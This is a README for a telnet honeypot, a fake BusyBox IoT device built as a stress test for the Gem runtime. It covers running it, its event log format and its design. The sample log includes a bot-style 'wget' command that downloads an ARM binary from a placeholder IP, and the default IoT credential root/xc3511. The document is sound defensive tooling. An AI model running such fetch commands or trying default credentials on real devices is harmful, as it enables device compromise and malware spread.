# honeypot

A telnet honeypot: a fake BusyBox IoT device that lets bots log in and
records what they try (credentials, commands, download URLs, the bytes
they `echo` into files). It is meant to run for weeks against hostile
traffic, as a stress test of Gem's runtime; `PLAN.md` has the whole plan
and which phases are done.

## Run it

```sh
build/gem examples/honeypot/main.gem                     # 127.0.0.1:2323
build/gem examples/honeypot/main.gem --port 2323 --bind 0.0.0.0
build/gem examples/honeypot/test.gem                     # the tests (part of make test)
```

```sh
telnet 127.0.0.1 2323        # or nc 127.0.0.1 2323, which skips negotiation as most bots do
```

Events go to stdout, one line each, with every byte outside printable
ASCII written as `\xHH`:

```
2026-10-10T08:50:34Z session=1 session_start ip="127.0.0.1" port=63312
2026-10-10T08:50:34Z session=1 login user="root" password="xc3511" ok=false
2026-10-10T08:50:35Z session=1 login user="root" password="xc3511" ok=true
2026-10-10T08:50:35Z session=1 command line="cd /tmp; wget http://1.2.3.4/bins/x.arm7 -O x"
2026-10-10T08:50:35Z session=1 url url="http://1.2.3.4/bins/x.arm7" via="wget"
2026-10-10T08:50:35Z session=1 command line="exit"
2026-10-10T08:50:35Z session=1 session_end reason="exit" bytes_in=81 bytes_out=337 logged_in=true ms=412
```

| Event | Fields |
|---|---|
| `session_start` | `ip`, `port` |
| `login` | `user`, `password`, `ok` |
| `command` | `line`, as typed |
| `url` | `url`, `via` (`wget`, `curl`, `tftp`, `ftpget`) |
| `echo` | `bytes`, what an `echo -e` decoded |
| `cap` | `cap`: `line_too_long`, `subneg_too_long` |
| `session_end` | `reason` (`closed`, `idle`, `exit`, `write_failed`), `bytes_in`, `bytes_out`, `logged_in`, `ms` |
| `crash` | `reason`: a session exited abnormally (after an error, its trace is on stderr) |
| `refused` | `ip`, `error`: no process could be spawned for the connection |

## Design

```
honeypot_sup (supervisor, one_for_one)
├── recorder            ── prints the events
└── front (supervisor, one_for_all)
    ├── registry        ── numbers the sessions, spawns and monitors them
    │                       └── per connection: a session
    └── acceptor        ── tcp_accept loop
```

| File | What it holds |
|---|---|
| `main.gem` | entry point: flags, listen, start |
| `server.gem` | the supervision tree and the accept loop |
| `registry.gem` | starts a session per connection, records crashes |
| `session.gem` | one connection: reads, echo, writes, timeouts |
| `telnet.gem` | strips telnet commands from the input, answers negotiation |
| `lines.gem` | splits the input into lines |
| `shell.gem` | the fake login and shell, as a state machine that does no I/O |
| `device.gem` | the fake device's canned text |
| `recorder.gem` | the event log lines |
| `test.gem` | unit tests and end-to-end tests over TCP |

Choices worth knowing:

- **Nothing is ever run or fetched.** `wget`, `curl`, `tftp` and
  `ftpget` record the URL; `wget` and `curl` print fake progress, and
  running a downloaded file prints nothing.
- **The shell does no I/O.** `shell.line` takes a line and returns the
  text to send and the events, so the tests drive it without sockets.
- **Negotiation answers each request at most once.** The server offers `WILL
  ECHO` and `WILL SUPPRESS-GO-AHEAD`, accepts the client's
  SUPPRESS-GO-AHEAD, refuses every other option, and never
  answers the same request twice, so a client that keeps asking can't
  make it loop. It echoes only for a client that accepted the echo, line
  by line, so a password that arrives in the same packet as its username
  isn't echoed.
- **A session's input buffers have caps.** A line over 4 KB is dropped
  without its bytes being kept, and a subnegotiation over 1 KB is
  abandoned, its rest read as ordinary input; both are logged.
- **Each session claims its socket**, so it closes however the session
  ends. The registry claims it before that; a socket still waiting in the
  registry's mailbox belongs to the acceptor, so the registry and the
  acceptor restart together, and a registry crash closes those too.

## Known limits

- **No limits yet on sessions per IP, session length, bytes or
  commands** (phase 5). Only the idle timeout (60 s) and the write
  timeout (5 s) end a session early.
- **Events are printed, not stored**, and a crashing session's input is
  lost (phase 4). The recorder's mailbox has no cap yet (phase 5).
- **Commands are split roughly.** `$VAR` and globs are kept as typed. A
  command substitution (`$(...)`, backquotes) runs, but all of a line's
  run before its commands, whatever `&&` and `||` decide, and its output
  isn't split into words. `(...)` and `{ ...; }` groups aren't parsed. In
  a pipeline, filters like `grep` and `head` pass their input through
  unchanged.
